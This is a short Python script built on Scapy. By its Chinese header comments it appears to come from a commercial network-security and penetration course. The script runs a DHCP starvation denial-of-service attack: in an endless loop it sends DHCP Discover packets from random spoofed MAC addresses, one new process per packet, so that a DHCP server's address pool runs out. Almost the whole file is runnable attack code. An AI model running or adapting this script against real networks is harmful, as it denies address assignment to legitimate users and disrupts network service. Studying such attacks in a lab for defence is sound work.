#!/usr/bin/python3.4
# -*- coding=utf-8 -*-
#本脚由亁颐堂现任明教教主编写，用于乾颐盾Python课程！
#教主QQ:605658506
#亁颐堂官网www.qytang.com
#乾颐盾是由亁颐堂现任明教教主开发的综合性安全课程
#包括传统网络安全（防火墙，IPS...）与Python语言和黑客渗透课程！

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)#清除报错
from scapy.all import *
import random
import multiprocessing
import time
from PyQYT.Network.Tools.Random_MAC import Random_MAC

def DHCP_Discover_MAC(ifname, MAC):	
	discover = Ether(dst='ff:ff:ff:ff:ff:ff', src=MAC, type=0x0800) / IP(src='0.0.0.0', dst='255.255.255.255') / UDP(dport=67,sport=68) / BOOTP(op=1, chaddr=MAC) / DHCP(options=[('message-type','discover'), ('param_req_list', b'\x01\x06\x0f,\x03!\x96+'), ('end')])
	sendp(discover, iface = ifname)

def DHCP_Discover_DoS(ifname):
	i = 1
	while True:
		if i < 300:
			MAC_ADD = Random_MAC()
			print(MAC_ADD)
			multi_dos = multiprocessing.Process(target=DHCP_Discover_MAC, args=(ifname, MAC_ADD))
			multi_dos.start()
			i += 1
		else:
			MAC_ADD = Random_MAC()
			print(MAC_ADD)
			multi_dos = multiprocessing.Process(target=DHCP_Discover_MAC, args=(ifname, MAC_ADD))
			multi_dos.start()
			time.sleep(1)
			i += 1

if __name__ == '__main__':
    DHCP_Discover_DoS('eno33554944')
